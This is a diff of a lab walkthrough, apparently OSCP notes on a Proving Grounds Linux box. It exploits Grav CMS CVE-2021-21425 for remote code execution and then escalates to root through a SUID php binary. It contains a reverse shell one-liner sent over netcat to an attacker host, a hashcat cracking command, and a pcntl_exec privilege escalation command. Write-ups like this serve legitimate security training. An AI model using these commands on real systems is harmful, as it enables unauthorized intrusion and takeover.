@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-03
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Easy
@@ -76,45 +77,45 @@ Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
 No enumeration conducted
 ## Port 80 - HTTP (Apache/2.4.41)
 - Visited `192.168.155.12` with Firefox
-![[Pasted image 20241003204915.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003204915.png]]
 - Found default installation page for `grav-admin`
 	- *Grav CMS is vulnerable to CVE-2021-21425  (Unauthenticated RCE)*
-![[Pasted image 20241003205021.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003205021.png]]
 - Returned to terminal and ran `gobuster` against target:
   `gobuster dir -u  http://192.168.155.12/grav-admin -w //usr/share/dirb/wordlists/big.txt`
- ![[Pasted image 20241003211448.png]]
+ ![[Cybersecurity-Resources/images/Pasted image 20241003211448.png]]
 ---
 # Exploitation
 ## CVE-2021-21425  (Unauthenticated RCE)
 - Identified exploit `49973.py`
 - Modified exploit to suit target and local system
-![[Pasted image 20241003212733.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003212733.png]]
 - Launched netcat listener: `nc -nvlp 4444`
 - Ran `49973.py` with reverse shell command & established initial access:
   `python3 49973.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.198 4444 >/tmp/f' -t http://192.168.155.12/grav-admin` 
-![[Pasted image 20241003213052.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003213052.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Enumerated files to find `admin` user with password hash `$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.`
-![[Pasted image 20241003215228.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003215228.png]]
 	- Hash identified as `bcrypt`
-![[Pasted image 20241003214410.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003214410.png]]
 	- Attempted to cracked with Hashcat:
   `hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt --force`
 		- Cancelled: Expected to completion >3 days
 - Enumerated `/etc/passwd`
-![[Pasted image 20241003215518.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003215518.png]]
 	- Identified user `alex:x:1000:1000::/home/alex:/bin/bash`
 		- Unable to access `/home/alex`
-		![[Pasted image 20241003215720.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241003215720.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 Attempted to upload `linpeas.sh` without success
-![[Pasted image 20241003213359.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003213359.png]]
 Enumerated binary permissions
-![[Pasted image 20241003222357.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003222357.png]]
 ## Privilege Escalation vector
 Checked GTFO bins for potential privilege escalation
 	- `php` with `SUID` bit set [GTFObins](https://gtfobins.github.io/gtfobins/php/#suid)
@@ -123,7 +124,7 @@ CMD="/bin/sh"`
 ./php -r "pcntl_exec('/bin/sh', ['-p']);"`
 ```
 - Achieved root access through privilege escalation & printed `proof.txt`
-![[Pasted image 20241003223019.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241003223019.png]]
 ---
 # Trophy & Loot
 `flag1.txt` = `T2Zmc2Vj`
